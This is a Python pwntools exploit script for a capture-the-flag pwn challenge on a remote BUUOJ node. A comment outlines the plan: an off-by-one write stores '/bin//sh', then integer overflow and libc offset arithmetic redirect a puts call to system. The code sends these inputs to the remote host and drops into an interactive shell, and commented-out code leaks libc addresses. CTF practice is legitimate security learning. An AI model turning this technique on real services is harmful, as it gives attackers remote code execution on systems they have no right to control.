'''
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled

1. set firstin to 1, secondin set as 2, to set v8 == 1
2. off-by-one to set firstin to 0 and v5 == '/bin//sh'
3. secondin set as 1, to set v9 == 1
(not necessary 4. leak libc address and get puts_addr through v7 >= 0x40000
(not necessary 5. interger overflow the v7 to 0x30000 to suit range of v3 (short int -32768~32767)
6. calculating the offset between puts_addr and system_addr | v7 == 0x40000 && v3 == xxx => call system('/bin//sh')
'''

from pwn import *
# from LibcSearcher import *


local = 0
url, port = "node5.buuoj.cn", "29092" 
filename = "./pwn"
elf = ELF(filename)
local_libc = '/home/fa1c4/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6'
remote_libc = './libc-2.31.so'
libc = ELF(local_libc if local else remote_libc)
context(arch="amd64", os="linux")
# context(arch="i386", os="linux")

if local:
    # context.log_level = "debug"
    io = process(filename)
    context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)
    pass

def B(tag=0):
    if tag: gdb.attach(io)
    pause()

def v7Plus(i):
    io.sendlineafter('2.扣2送kfc联名套餐\n'.encode(), b'1')
    log.info('v7Plus times {}'.format(i))

def pwn():
    io.sendlineafter('请选择你的伙伴\n'.encode(), b'1')
    io.sendlineafter('2.扣2送kfc联名套餐\n'.encode(), b'2')
    io.sendlineafter('你有什么想对肯德基爷爷说的吗?\n'.encode(), b'/bin//sh')

    # for i in range(4):
    #     v7Plus(i)
    # io.recvuntil('感谢你完成了今天的委托，这是给你的奖励 '.encode())
    # system_addr = int(io.recvuntil(b'\n', drop=True), 16)
    # libc.address = system_addr - libc.sym['system']
    # puts_addr = libc.sym['puts']
    # log.success(f'libc.address: {hex(libc.address)}')
    # log.success(f'system_addr: {hex(system_addr)}')
    # log.success(f'puts_addr: {hex(puts_addr)}')

    # for i in range(65536 - 4 + 3): # takes 6000s for remote exploit
    #     v7Plus(i)

    # relative_offset = puts_addr - system_addr  # puts_addr - v3 - v7 == system_addr
    # v3_value = relative_offset - 0x40000
    # v3_value = relative_offset - 0x30000
    # log.success(f'relative_offset: {hex(relative_offset)}')
    
    # no need to leak libc address, the relative offset is constant
    for i in range(3): # takes 6000s for remote exploit
        v7Plus(i)

    v3_value = 8592
    log.success(f'v3_value: {hex(v3_value)}')

    io.sendlineafter('2.扣2送kfc联名套餐\n'.encode(), b'3')
    io.sendlineafter(b'you are good mihoyo player!\n', str(v3_value).encode())


if __name__ == "__main__":
    pwn()
    io.interactive()
